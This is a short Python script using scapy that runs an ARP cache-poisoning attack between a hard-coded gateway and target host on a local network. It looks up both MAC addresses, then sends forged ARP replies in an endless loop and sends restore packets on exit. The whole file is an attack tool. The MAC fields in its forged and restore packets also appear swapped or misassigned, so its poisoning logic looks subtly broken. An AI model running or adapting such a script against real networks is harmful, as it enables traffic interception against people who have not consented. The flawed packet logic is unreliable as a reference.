from scapy.all import *
import time

GETWAY_IP = '192.168.0.1'
TARGET_IP = '192.168.0.200'

def get_mac(ip_address):
    #ARP request is constructed. sr function is used to send/ receive a layer 3 packet
    #Alternative Method using Layer 2: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=1, timeout=2, verbose=False)
    for s,r in resp:
        return r[ARP].hwsrc
    return None

def poison(gateway_mac, target_mac):
    print("Arp atk started ----")
    try:
        while True:
            send(ARP(op=2, pdst=GETWAY_IP, hwsrc=gateway_mac, psrc=TARGET_IP))
            send(ARP(op=2, pdst=TARGET_IP, hwsrc=target_mac, psrc=GETWAY_IP))
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping arp attack ----")
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=GETWAY_IP, hwsrc=target_mac, psrc=TARGET_IP), count=5)
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=TARGET_IP, hwsrc=gateway_mac, psrc=GETWAY_IP), count=5)


print("Starting Atk -------")
print(f"Gateway IP address: {GETWAY_IP}")
print(f"Target IP address: {TARGET_IP}")

gateway_mac = get_mac(GETWAY_IP)
if gateway_mac is None:
    print("Unable to get gateway MAC address. Exiting..")
    sys.exit(0)
else:
    print(f"Gateway MAC address: {gateway_mac}")

target_mac = get_mac(TARGET_IP)
if target_mac is None:
    print("Unable to get target MAC address. Exiting..")
    sys.exit(0)
else:
    print(f"Target MAC address: {target_mac}")


poison(gateway_mac, target_mac)
        
      







